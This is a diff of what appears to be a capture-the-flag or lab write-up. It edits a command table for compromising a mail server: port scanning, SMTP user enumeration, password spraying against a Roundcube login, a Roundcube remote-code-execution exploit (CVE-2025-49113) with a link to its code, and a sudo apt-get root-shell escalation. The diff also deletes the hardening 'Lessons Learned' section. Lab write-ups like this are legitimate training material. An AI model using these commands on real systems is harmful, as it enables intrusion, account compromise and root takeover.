@@ -335,25 +335,15 @@ cat /usr/user.txt
 |---|---|---|
 | Port scan | nmap | `nmap -p- -sV -sC -T4 <IP>` |
 | SMTP enum | smtp-user-enum | `smtp-user-enum -M VRFY -U names.txt -t <IP>` |
-| SMTP validate | swaks | `swaks --server <IP> --from a@b --to kali@kali` |
-| RCE | CVE-2025-49113.py | `python3 CVE-2025-49113.py <url> kali <pass> <cmd>` |
+| SMTP validate | cubeSpraying | `python3 cubeSpraying.py -u http://10.1.32.43/roundcube/ -U maria -P ../passwords.txt  -v` |
+| RCE | CVE-2025-49113.py | `python3 CVE-2025-49113.py <url> maria <pass> <cmd>` |
 | Privesc | sudo apt-get | `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh` |
-
----
-
-## 🧠 Lessons Learned
-
-1. **VRFY is a silent information leak.** Disabling `VRFY` in Postfix (`disable_vrfy_command = yes`) prevents unauthenticated username enumeration.
-2. **Disable SMTP features you don't use.** `ETRN` should be off unless explicitly needed.
-3. **Roundcube must be patched.** CVE-2025-49113 requires only valid mail credentials — a single phished or reused password leads to full RCE.
-4. **Never grant `sudo` on package managers.** `apt-get`, `apt`, `dpkg`, and similar tools all support options (`Pre-Invoke`, `DPkg::Pre-Install-Pkgs`, etc.) that execute arbitrary commands as root. GTFOBins documents these thoroughly.
-5. **Negative results are data.** Ruling out relay and SMTP AUTH early is what pointed the assessment toward the web service.
 
 ---
 
 ## 📚 References
 
-- CVE-2025-49113 — Roundcube PHP object injection (authenticated RCE)
+- CVE-2025-49113 — Roundcube PHP object injection (authenticated RCE) `https://github.com/Zwique/CVE-2025-49113`
 - GTFOBins — `apt-get`: https://gtfobins.github.io/gtfobins/apt-get/
 - Postfix configuration hardening — `disable_vrfy_command`, `smtpd_relay_restrictions`
 - RFC 5321 — SMTP `VRFY` and `ETRN`
